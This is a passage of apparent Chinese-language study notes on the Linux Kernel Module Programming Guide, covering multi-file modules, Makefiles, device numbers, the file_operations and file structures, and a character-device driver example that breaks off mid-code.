<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  start.c - Illustration of multi filed modules</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world - this is the kernel speaking\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  stop.c - Illustration of multi filed modules</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Short is the life of a kernel module\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>Makefile</code>：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m += hello-1.o</span><br><span class="line">obj-m += hello-2.o</span><br><span class="line">obj-m += hello-3.o</span><br><span class="line">obj-m += hello-4.o</span><br><span class="line">obj-m += hello-5.o</span><br><span class="line">obj-m += startstop.o</span><br><span class="line">startstop-objs := start.o stop.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(<span class="built_in">shell</span> pwd)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(<span class="built_in">shell</span> pwd)</span> clean</span><br></pre></td></tr></table></figure>

<h3 id="2-8-重新编译内核"><a href="#2-8-重新编译内核" class="headerlink" title="2.8 重新编译内核"></a>2.8 重新编译内核</h3><p>有利于版本的匹配以及内核模块的动态装载以及强制卸载。此处不再详细描述。想了解的读者可以参考原文（<a href="https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html#AEN380%EF%BC%89">https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html#AEN380）</a></p>
<h2 id="Chapter-3-初步知识"><a href="#Chapter-3-初步知识" class="headerlink" title="Chapter 3 初步知识"></a>Chapter 3 初步知识</h2><h3 id="3-1-模块与程序"><a href="#3-1-模块与程序" class="headerlink" title="3.1 模块与程序"></a>3.1 模块与程序</h3><h4 id="3-1-1-模块如何开始与结束"><a href="#3-1-1-模块如何开始与结束" class="headerlink" title="3.1.1 模块如何开始与结束"></a>3.1.1 模块如何开始与结束</h4><ul>
<li>程序通常使用main()函数作为入口函数，在执行完所有指令后退出。</li>
<li>内核模块使用module__init指定入口函数。初始化操作向内核提供了模块的函数，当内核需要调用模块函数时才会真正执行模块中代码；模块结束使用module_exit，是init操作的反向操作。</li>
</ul>
<h4 id="3-1-2-模块可以调用的函数"><a href="#3-1-2-模块可以调用的函数" class="headerlink" title="3.1.2  模块可以调用的函数"></a>3.1.2  模块可以调用的函数</h4><p>程序可以调用标准C语言库，例如<code>printf()</code>。</p>
<p>内核模块只能调用内核实现的函数，因为模块的目标文件的符号由insmod解析。符号的定义来自于内核本身，导致能够调用的函数只能是由内核提供的，即系统调用（write，ioctl，read）。内核到处的符号可以参见<code>/proc/kallsyms</code>。</p>
<p>库函数运行在用户空间，向开发者提供了系统调用更方便的接口（库函数仍然需要调用系统调用实现）。系统调用运行在内核态。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>gcc -Wall -o test test.c</code>编译，<code>strace ./hello</code>可以看到输出最后有<code>write(1, &quot;hello&quot;, 5hello)</code>为printf使用的系统调用。</p>
<p><code>man 2 write</code>：查看write函数的使用说明，2代表系统调用（kill(), read()）；3代表库函数</p>
<p>可以使用模块来替代内核的系统调用，基于此可以实现插入后门或木马等操作。</p>
<h4 id="3-1-3-用户空间与内核空间"><a href="#3-1-3-用户空间与内核空间" class="headerlink" title="3.1.3 用户空间与内核空间"></a>3.1.3 用户空间与内核空间</h4><p>内核态与用户态的转换</p>
<h4 id="3-1-4-命名空间"><a href="#3-1-4-命名空间" class="headerlink" title="3.1.4 命名空间"></a>3.1.4 命名空间</h4><p>开发者自己开发的变量名不能与其他开发者的冲突，因此会有命名空间来避免（C++有<code>std::</code>，C里这里只提到了要多注意，应该是没有）</p>
<p>当写内核模块时，由于内核模块会被加载到整个内核，因此更需要进行命名管理。最好的方式是将所有变量声明为static且使用合适的前缀命名变量。习惯上，Linux内核变量名一般为小写形式。（还可以定义一个符号表，后面会提到）</p>
<h4 id="3-1-5-代码空间"><a href="#3-1-5-代码空间" class="headerlink" title="3.1.5 代码空间"></a>3.1.5 代码空间</h4><p>内存管理是十分复杂的问题。这里只探究写内核模块需要考虑的问题</p>
<p>每开启一个新进程，内核会为其分配一个真实的物理内存，内存在进程看来为虚拟内存，从0x00000000开始，不同进程的内存地址（0xbffff978）对应的实际地址并不相同。每个进程的虚拟内存与实际内存之间存在着特定偏移。且不同进程无法访问其他进程的内存地址。</p>
<p>内核也有自己的代码空间。由于内核模块是加载到内核中使用，其会与内核共享代码空间。因此如果内核模块内存错误，内核也会出现内存错误。</p>
<p>以上为针对宏内核操作系统，微内核操作系统每个模块有独立的代码空间（GNU Hurd， QNX Neutrino）。</p>
<h4 id="3-1-6-Device-Drivers"><a href="#3-1-6-Device-Drivers" class="headerlink" title="3.1.6 Device Drivers"></a>3.1.6 Device Drivers</h4><p>一类模块是设备驱动程序，为硬件提供功能。在unix系统中，每一个硬件都由&#x2F;dev中的文件表示。设备驱动程序可以代表用户程序与硬件进行通信。例如es1370.o声卡驱动程序可以将&#x2F;dev&#x2F;sound连接到Ensoniq IS1370声卡。用户空间的程序可以直接使用&#x2F;dev&#x2F;sound不需要考虑声卡类型。</p>
<h5 id="3-1-6-1-Major-and-Minor-Numbers"><a href="#3-1-6-1-Major-and-Minor-Numbers" class="headerlink" title="3.1.6.1 Major and Minor Numbers"></a>3.1.6.1 Major and Minor Numbers</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ls -l /dev/sda[1-3]</span><br><span class="line">brw-rw---- 1 root disk 8, 1  1月  5 09:11 /dev/sda1</span><br><span class="line">brw-rw---- 1 root disk 8, 2  1月  5 09:11 /dev/sda2</span><br><span class="line">brw-rw---- 1 root disk 8, 3  1月  5 09:11 /dev/sda3</span><br></pre></td></tr></table></figure>

<p>上图表示了硬盘的前三个分区，其中由逗号分隔的数字前面的为Major Number，后面为Minor Number。Major Number表示哪一个设备驱动访问该硬件，每一个设备驱动都有特定的major number。</p>
<p>Minor Number用来分别同一驱动控制的不同设备。</p>
<p>设备分为两类：字符设备和块设备。块设备有一个缓冲区存放请求（可以对请求进行排序）存储设备；字符设备则没有缓冲区。可以通过查看ls -l中第一个字符为’b’还是’c’来分辨。</p>
<p>可以通过查阅<code>/usr/src/linux/Documentation/devices.txt</code>来了解major number对应的设备</p>
<h2 id="Chapter-4-字符设备文件"><a href="#Chapter-4-字符设备文件" class="headerlink" title="Chapter 4 字符设备文件"></a>Chapter 4 字符设备文件</h2><h3 id="4-1-字符设备驱动程序"><a href="#4-1-字符设备驱动程序" class="headerlink" title="4.1 字符设备驱动程序"></a>4.1 字符设备驱动程序</h3><h4 id="4-1-1-file-operations-结构体"><a href="#4-1-1-file-operations-结构体" class="headerlink" title="4.1.1 file_operations 结构体"></a>4.1.1 file_operations 结构体</h4><p>提供了设备驱动程序对设备的多种操作函数的地址，操作函数定义在内核模块中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	 <span class="type">loff_t</span>(*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">	 <span class="type">ssize_t</span>(*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*aio_read) (<span class="keyword">struct</span> kiocb *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span>);</span><br><span class="line">	 <span class="type">ssize_t</span>(*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*aio_write) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>,</span><br><span class="line">			      <span class="type">loff_t</span>);</span><br><span class="line">	<span class="type">int</span> (*readdir) (<span class="keyword">struct</span> file *, <span class="type">void</span> *, <span class="type">filldir_t</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span>;</span><br><span class="line">	<span class="type">int</span> (*ioctl) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>,</span><br><span class="line">		      <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">	<span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">	<span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dentry *, <span class="type">int</span> datasync);</span><br><span class="line">	<span class="type">int</span> (*aio_fsync) (<span class="keyword">struct</span> kiocb *, <span class="type">int</span> datasync);</span><br><span class="line">	<span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*readv) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>,</span><br><span class="line">			  <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*writev) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>,</span><br><span class="line">			   <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*sendfile) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">read_actor_t</span>,</span><br><span class="line">			     <span class="type">void</span> __user *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>,</span><br><span class="line">			     <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>,</span></span><br><span class="line"><span class="params">					    <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>,</span></span><br><span class="line"><span class="params">					    <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>改进</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc extension</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">	read: device_read,</span><br><span class="line">	write: device_write,</span><br><span class="line">	open: device_open,</span><br><span class="line">	release: device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C99 way</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">	.read = device_read,</span><br><span class="line">	.write = device_write,</span><br><span class="line">	.open = device_open,</span><br><span class="line">	.release = device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="4-1-2-file结构体"><a href="#4-1-2-file结构体" class="headerlink" title="4.1.2 file结构体"></a>4.1.2 file结构体</h4><p>每个设备在内核中由file结构体表示。该结构是内核水平的结构体，不会再用户空间出现。与glibc定义的FILE结构体不同。另外，其代表的是抽象的打开file，而不是硬盘上的file文件（使用inode结构体表示）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * f_&#123;lock,count,pos_lock&#125; members can be highly contended and share</span></span><br><span class="line"><span class="comment"> * the same cacheline. f_&#123;lock,mode&#125; are very frequently used together</span></span><br><span class="line"><span class="comment"> * and so share the same cacheline as well. The read-mostly</span></span><br><span class="line"><span class="comment"> * f_&#123;path,inode,op&#125; are kept on a separate cacheline.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">f_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">f_rcuhead</span>;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> 		f_iocb_flags;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="type">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="type">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="type">loff_t</span>			f_pos;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		f_flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="type">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="type">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="type">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="4-1-3-Registering-A-Device"><a href="#4-1-3-Registering-A-Device" class="headerlink" title="4.1.3 Registering A Device"></a>4.1.3 Registering A Device</h4><p>添加一个驱动需要向内核进行注册。该操作会向其分配一个major number（没有minor number因为其只与驱动有关，与内核无关）。使用<code>register_chrdev</code>函数 (<code>linux/fs.h</code>) 进行注册</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">register_chrdev</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> major, <span class="type">const</span> <span class="type">char</span> *name, <span class="keyword">struct</span> file_operations *fops)</span>;</span><br><span class="line"><span class="comment">// 返回值为负表明注册失败</span></span><br></pre></td></tr></table></figure>

<p><code>unsigned int major</code>: 请求的major number</p>
<p><code>char *name</code>: 设备驱动的名字，会保存在<code>/proc/devices</code>中。</p>
<p><code>struct file_operations *fops</code>： 是<code>file_operations</code>表的指针</p>
<p>注：为了保证请求的<code>major number</code>不与已有的设备驱动冲突，可以 1）查看<code>/Documentation/devices.txt</code>；2）传入<code>major number</code> 0.会返回动态分配的<code>major number</code>。缺点是不能提前新建驱动文件。可以手动创建或构造脚本，或者使用<code>mknod</code>命令自动创建</p>
<p>注：存在一种方式自动创建设备<code>class_create()</code>，Linux内核提供一组函数，可以用来在模块加载的时候自动在&#x2F;dev目录下创建相应的设备节点，并在卸载模块时删除该节点，当然前提条件是用户空间移植了<a href="https://zhuanlan.zhihu.com/p/373517974">udev</a>（一个用户空间程序）。内核中定义了<code>struct class</code>结构体，顾名思义，一个<code>struct class</code>结构体类型变量对应一个类，内核同时提供了<code>class_create()</code>函数，可以用它来创建一个类，这个类存放在sysfs下，一旦创建好后，再调用<code>device_create()</code>函数来在&#x2F;dev目录下创建相应的设备节点。这样，加载模块的时候，用户空间中的udev会自动响应<code>device_create()</code>函数，去&#x2F;sysfs下寻找对应的类从而创建设备节点。i</p>
<h4 id="4-1-4-Unregistering-A-Device"><a href="#4-1-4-Unregistering-A-Device" class="headerlink" title="4.1.4 Unregistering A Device"></a>4.1.4 Unregistering A Device</h4><p>我们不能让root用户需要需要使用内核模块时将其卸载。如果设备驱动文件被一个进程打开然后将其内核模块卸载，使用该文件会造成对原内核模块对应的内存地址的访问，但由于内存地址已发生改变，会导致意想不到的结果。</p>
<p>一般情况下，可以让函数返回负值来禁用某功能，不过<code>cleaup_module</code>无法实现因为其为<code>void</code>函数。不过，存在一个计数器来记录多少进程在占用模块。通过<code>/proc/modules</code>的第三个参数即可。若不为零，则无法卸载（该操作内核已实现）</p>
<p>可以使用以下函数来改变计数器值：</p>
<p><code>try_module_get(THIS_MODULE)</code>: 增加计数</p>
<p><code>module_put(THIS_MODULE)</code>： 减少计数</p>
<h4 id="4-1-5-chardev-c"><a href="#4-1-5-chardev-c" class="headerlink" title="4.1.5 chardev.c"></a>4.1.5 chardev.c</h4><p>以下代码创建了一个字符类设备驱动<code>chardev</code>。该设备文件可以记录设备文件被读取的次数。无法写入该设备文件，不过会记录此行为并告知用户该行为不受支持。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  chardev.c: Creates a read-only char device that says how many times</span></span><br><span class="line"><span class="comment"> *  you&#x27;ve read from the dev file</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/uaccess.h&gt;</span>	<span class="comment">/* for put_user */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  Prototypes - this would normally go in a .h file</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_open</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_release</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_read</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_write</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;chardev&quot;</span>	<span class="comment">/* Dev name as it appears in /proc/devices   */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_LEN 80		<span class="comment">/* Max length of the message from the device */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Global variables are declared as static, so are global within the file. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> Major;		<span class="comment">/* Major number assigned to our device driver */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> Device_Open = <span class="number">0</span>;	<span class="comment">/* Is device open?  </span></span><br><span class="line"><span class="comment">				 * Used to prevent multiple access to device */</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> msg[BUF_LEN];	<span class="comment">/* The msg the device will give when asked */</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *msg_Ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">	.read = device_read,</span><br><span class="line">	.write = device_write,</span><br><span class="line">	.open = device_open,</span><br><span class="line">	.release = device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This function is called when the module is loaded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        Major = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;fops);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Major &lt; <span class="number">0</span>) &#123;</span><br><span class="line">	  printk(KERN_ALERT <span class="string">&quot;Registering char device failed with %d\n&quot;</span>, Major);</span><br><span class="line">	  <span class="keyword">return</span> Major;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;I was assigned major number %d. To talk to\n&quot;</span>, Major);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;the driver, create a dev file with\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;&#x27;mknod /dev/%s c %d 0&#x27;.\n&quot;</span>, DEVICE_NAME, Major);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Try various minor numbers. Try to cat and echo to\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;the device file.\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Remove the device file and module when done.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This function is called when the module is unloaded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Unregister the device </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> ret = unregister_chrdev(Major, DEVICE_NAME);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		printk(KERN_ALERT <span class="string">&quot;Error in unregister_chrdev: %d\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Methods</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Called when a process tries to open the device file, like</span></span><br><span class="line"><span class="comment"> * &quot;cat /dev/mycharfile&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Device_Open)</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">	Device_Open++;</span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">&quot;I already told you %d times Hello world!\n&quot;</span>, counter++);</span><br><span class="line">	msg_Ptr = msg;</span><br><span class="line">	try_module_get(THIS_MODULE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Called when a process closes the device file.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	Device_Open--;		<span class="comment">/* We&#x27;re now ready for our next caller */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Decrement the usage count, or else once you opened the file, you&#x27;ll</span></span><br><span class="line"><span class="comment">	 * never get get rid of the module. </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	module_put(THIS_MODULE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Called when a process, which already opened the dev file, attempts to</span></span><br><span class="line"><span class="comment"> * read from it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_read</span><span class="params">(<span class="keyword">struct</span> file *filp,	<span class="comment">/* see include/linux/fs.h   */</span></span></span><br><span class="line"><span class="params">			   <span class="type">char</span> *buffer,	<span class="comment">/* buffer to fill with data */</span></span></span><br><span class="line"><span 